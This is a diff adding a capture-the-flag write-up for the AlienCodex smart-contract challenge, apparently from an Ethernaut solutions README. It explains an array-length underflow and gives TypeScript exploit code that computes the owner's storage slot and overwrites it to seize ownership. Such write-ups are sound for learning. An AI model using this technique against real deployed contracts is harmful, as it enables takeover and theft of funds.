@@ -455,6 +455,40 @@ Here are two great writeups that explain it:
 
 ## 19 - AlienCodex
 
+The goal of this challenge is to become the owner of the contract.
+
+The contract has a vulnerable dynamic array because of the function:
+
+```solidity
+function retract() contacted public {
+  codex.length--;
+}
+```
+
+If the function is called when the array length is 0, it will underflow, resulting in having its length equal to the size of the storage.
+
+That said, we can modify any slot in the storage, including the one used for the `owner`.
+
+We can calculate the position of the slot used for the owner:
+
+```typescript
+const mapLengthAddress = "0x0000000000000000000000000000000000000000000000000000000000000001";
+const mapStartSlot = BigNumber.from(ethers.utils.keccak256(mapLengthAddress));
+
+const NUMBER_OF_SLOTS = BigNumber.from("2").pow("256");
+const ownerPositionInMap = NUMBER_OF_SLOTS.sub(mapStartSlot);
+```
+
+Then we can just override it and win:
+
+```typescript
+const parsedAddress = ethers.utils.hexZeroPad(attacker.address, 32)
+const tx = await contract.revise(ownerPositionInMap, parsedAddress)
+await tx.wait()
+```
+
+[Script](./scripts/19-AlienCodex.ts) | [Test](./test/19-AlienCodex.spec.ts)
+
 ## 20 - Denial
 
 The goal of this challenge is to perform a DOS on the contract, when the owner tries to use the `withdraw`:
